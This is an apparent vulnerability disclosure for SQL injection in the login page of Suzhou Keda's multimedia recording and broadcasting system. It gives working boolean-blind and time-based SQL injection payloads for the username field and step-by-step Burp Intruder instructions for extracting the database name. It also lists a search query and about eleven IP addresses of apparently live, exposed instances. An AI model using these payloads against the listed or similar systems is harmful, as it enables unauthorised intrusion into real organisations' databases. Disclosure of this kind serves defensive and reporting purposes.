sql injection exists in the foreground of multimedia recording and broadcasting system of Suzhou Keda Technology Co., LTD

Vulnerability description

sql injection exists in the foreground of multimedia recording and broadcasting system of Suzhou Keda Technology Co., LTD. Attackers can obtain sensitive database information through this vulnerability.

Proof of company assets:

![](https://github.com/chennuo17/cve/blob/main/picture/1.png)

company's official website：https://www.kedacom.com/cn

Impact version: v5.2,v6.0

Influence routing:

Authorization: Digest_SM3 username="admin"

injection parameter:username

Space mapping： title="科达视讯云-会议录播系统"

![](https://github.com/chennuo17/cve/blob/main/picture/2.png)

Example I

http://123.178.21.234:4700/login.html

· Enter the user name in the login area payload：admin22'or if(ascii(mid(database(),1,1))=55,1,2)=1#

Enter the password as you please  1111111
At this point, observe the burp history packet and place it into the intruder for blasting

![](https://github.com/chennuo17/cve/blob/main/picture/3.png)

Select the second packet, the one with the shorter length, and send it to the intruder

![](https://github.com/chennuo17/cve/blob/main/picture/4.png)

Add $to this 55 right here

![](https://github.com/chennuo17/cve/blob/main/picture/5.png)

number   choose   32-126

![](https://github.com/chennuo17/cve/blob/main/picture/6.png)

Observe the length length, the ascii code decoding corresponding to the last 107 is k, and then adjust the second position in mid continuously to obtain the database name kdvvrs

![](https://github.com/chennuo17/cve/blob/main/picture/7.png)

Instance II

http://123.178.21.234:4700/login.html

· Enter the user name in the login area payload：admin22'or if(ascii(mid(database(),1,1))=55,1,2)=1#

Enter the password as you please 1111111
At this point, observe the burp history package, put it into the intruder and blast it, other steps are the same as above.
 ![](https://github.com/chennuo17/cve/blob/main/picture/8.png)

Example 3

[http://125.87.2.93:8888/login.html](http://123.178.21.234:4700/login.html)

· Enter the user name in the login area payload：admin22'or if(ascii(mid(database(),1,1))=55,1,2)=1#

Enter the password as you please  1111111
At this point, observe the burp history package, put it into the intruder and blast it, other steps are the same as above.
This is to see if there is "error_code" : 5, and use this to filter the correct response

 ![](https://github.com/chennuo17/cve/blob/main/picture/9.png)

![](https://github.com/chennuo17/cve/blob/main/picture/10.png)

 The first digit of the database is k, the second digit is d, and finally kdvvrs

 

![](https://github.com/chennuo17/cve/blob/main/picture/11.png)

Note: Some subsequent time blind note: can be used

payload:admin22'or if(ascii(mid(database(),1,1))=107,sleep(4),'1'='1')# to validate, delay when correct, not when incorrect, Since the first digit of the database is k, we can use 107 to verify whether the delay is sufficient.

Other cases：

4. https://101.71.125.187/login.html
5. https://60.170.38.162:4443/login.html
6. https://118.182.85.74:8020/login.html
7. https://60.168.128.203:8020/login.html
8. https://183.234.187.101/login.html
9. https://183.242.47.149:8020/login.html
10. http://125.87.2.93:8888/login.html
11. http://111.75.206.239/login.html

# Number of the CNVD certificate

 CNVD-YCGW-202406042039

